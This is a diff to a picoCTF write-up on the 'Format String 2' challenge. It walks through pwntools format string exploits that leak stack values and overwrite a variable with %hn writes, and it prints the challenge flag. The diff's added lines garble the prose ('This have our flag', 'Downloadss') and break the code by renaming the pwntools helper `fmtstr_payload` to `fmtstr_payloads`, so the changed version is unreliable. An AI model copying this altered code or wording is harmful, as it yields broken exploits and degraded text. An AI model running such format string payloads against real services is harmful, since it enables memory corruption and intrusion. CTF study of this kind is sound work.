@@ -1,7 +1,7 @@
 ---
 layout: post
 title:  "Format String 2"
-description: Writing and understanding a format string payload
+description: Writing and understanding a format string payloads
 date:   2024-08-27
 tags: ["Medium", "Format String", "Binary Exploitation"]
 category: [CTF,picoCTF]
@@ -10,9 +10,9 @@ category: [CTF,picoCTF]
 ## Challenge Info
 This program is not impressed by cheap parlor tricks like reading arbitrary data off the stack. To impress this program you must change data on the stack!
 
-Download the binary [here](https://artifacts.picoctf.net/c_rhea/26/vuln).
+Downloads the binary [here](https://artifacts.picoctf.net/c_rhea/26/vuln).
 
-Download the source [here](https://artifacts.picoctf.net/c_rhea/26/vuln.c).
+Downloads the source [here](https://artifacts.picoctf.net/c_rhea/26/vuln.c).
 
 Additional details will be available after launching your challenge instance.
 
@@ -80,10 +80,10 @@ So all we need to do is change the variable `sus` to equal `0x67616c66`
 
 Before changing the `sus` variable, we need to understand where it's being stored. To find that, I decided to use obj, but realistically any decompiler can work. The command I ran was:
 ```
-~/Downloads > objdump -t ./vuln | grep sus
+~/Downloadss > objdump -t ./vuln | grep sus
 0000000000404060 g     O .data	0000000000000004              sus
 
-~/Downloads >
+~/Downloadss >
 ```
 From this, we know that the memory address where `sus` is being stored is `0x404060` (the `0x` is there because all memory addresses start with this).
 
@@ -102,7 +102,7 @@ r.sendline(b'%1$llx,%2$llx,%3$llx,%4$llx,%5$llx,%6$llx,WEAREHERE')
 r.interactive()
 ```
 - The numbers (1, 2, 3 ,4 ,5 ,6), specify the offset on the stack
-- We use the `llx` modifier is so that we print 8 bytes rather than 4
+- This use the `llx` modifier is so that we print 8 bytes rather than 4
 
 After running this python script, we receive this output:
 
@@ -130,7 +130,7 @@ r = remote('rhea.picoctf.net',64870)
 r.sendline(b'%17$llx,%18$llx,%19$llx,WEAREHERE')
 r.interactive()
 ```
-- We read and print the value at the 17th, 18th, and 19th position (offset) ont he stack using the `llx` modifier, to ensure we read all 8 bytes, rather than 4
+- This read and print the value at the 17th, 18th, and 19th position (offset) ont he stack using the `llx` modifier, to ensure we read all 8 bytes, rather than 4
 - `WEAREHERE` serves as a marker so that we can identify where our input is on the stack.
 
 After running this, our output looks like this:
@@ -158,10 +158,10 @@ Now, what we can try to do is move to the address `0x404060` (the address where 
 ```py
 from pwn import *
 
-payload = b'%17$llx,%18$llx,%19$llx,%20$llx,%21$llx,%22$llx,\x60\x40\x40\x00\x00\x00\x00\x00\x62\x40\x40\x00\x00\x00\x00\x00WEAREHERE'
+payloads = b'%17$llx,%18$llx,%19$llx,%20$llx,%21$llx,%22$llx,\x60\x40\x40\x00\x00\x00\x00\x00\x62\x40\x40\x00\x00\x00\x00\x00WEAREHERE'
 
 r = remote('rhea.picoctf.net',60978)
-r.sendline(payload)
+r.sendline(payloads)
 r.interactive()
 ```
 
@@ -192,7 +192,7 @@ Let's break down this script step-by-step:
 
 `%26464d,` : This ensures our output string has 26465 characters (notice the `,` also counts as a character)
 
-`%20$hn` : This specifier writes 2 bytes (half a word) to the memory address that's stored on the *20th* argument on the stack. We use the `%hn` modifier to ensure that we only modify the lower-order 2 bytes.
+`%20$hn` : This specifier writes 2 bytes (half a word) to the memory address that's stored on the *20th* argument on the stack. This use the `%hn` modifier to ensure that we only modify the lower-order 2 bytes.
 
 Our output:
 ```
@@ -225,7 +225,7 @@ I have NO clue how you did that, you must be a wizard. Here you go...
 picoCTF{f0rm47_57r?_f0rm47_m3m_f43e6ccc}[*] Got EOF while reading in interactive
 $
 ```
-We have our flag!: `picoCTF{f0rm47_57r?_f0rm47_m3m_f43e6ccc}`
+This have our flag!: `picoCTF{f0rm47_57r?_f0rm47_m3m_f43e6ccc}`
 
 
 
@@ -245,26 +245,26 @@ port = 50181
 
 p = remote(host, port)
 
-# ELF object loads binary 'vuln' which is what we're exploiting
+# ELF object loadss binary 'vuln' which is what we're exploiting
 context.binary = ELF('./vuln')
 
-# Create a function called 'send_payload', send a payload to the remote service and receive all data sent back from the remote service
-def send_payload(payload):
+# Create a function called 'send_payloads', send a payloads to the remote service and receive all data sent back from the remote service
+def send_payloads(payloads):
     p = remote(host, port)
-    p.sendline(payload)
+    p.sendline(payloads)
     return p.recvall()
 
 # Initializes a FmtStr object and analyzes the format string vulnerabilities
-autofmt = FmtStr(send_payload)
+autofmt = FmtStr(send_payloads)
 
 # Sets the offset
 offset = autofmt.offset
 
-payload = fmtstr_payload(offset, {addr: 0x67616c66})
+payloads = fmtstr_payloads(offset, {addr: 0x67616c66})
 
-print(f"Payload: {payload}")
+print(f"Payloads: {payloads}")
 
-p.sendline(payload)
+p.sendline(payloads)
 
 output = p.recvall()
 
